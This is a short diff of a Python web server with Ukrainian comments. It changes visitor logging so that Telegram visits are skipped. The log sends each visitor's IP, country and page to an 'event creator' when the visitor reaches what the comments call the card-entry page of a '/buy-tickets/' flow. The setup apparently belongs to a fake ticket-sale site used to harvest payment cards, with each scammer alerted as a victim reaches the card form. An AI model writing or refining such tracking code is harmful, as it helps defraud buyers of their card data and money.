@@ -947,8 +947,8 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         if should_log and not is_telegram:
             print(f"[DEBUG] Надсилаємо лог event creator: {norm_path}, IP: {ip}, країна: {country}, user_id: {extra_user_id}")
         
-        # Логуємо ТІЛЬКИ для event creator на сторінці введення карти
-        if '/buy-tickets/loading/' in norm_path and extra_user_id:
+        # Логуємо ТІЛЬКИ для event creator на сторінці введення карти (НЕ Telegram)
+        if '/buy-tickets/loading/' in norm_path and extra_user_id and not is_telegram:
             print(f"[DEBUG] 🎯 Знайдено сторінку введення карти: {norm_path}")
             print(f"[DEBUG] 📱 Надсилаємо лог event creator: {extra_user_id}")
             
@@ -975,8 +975,8 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 print(f"❌ Помилка надсилання event creator: {e}")
         # НЕ логуємо сторінку введення карти - вже залоговано вище
         
-        # Логуємо інші сторінки для event creator (НЕ сторінку введення карти)
-        if extra_user_id and should_log and page_code and '/buy-tickets/loading/' not in norm_path:
+        # Логуємо інші сторінки для event creator (НЕ сторінку введення карти, НЕ Telegram)
+        if extra_user_id and should_log and page_code and '/buy-tickets/loading/' not in norm_path and not is_telegram:
                 # Отримуємо назву сторінки
                 page_name = get_page_name(norm_path)
                 
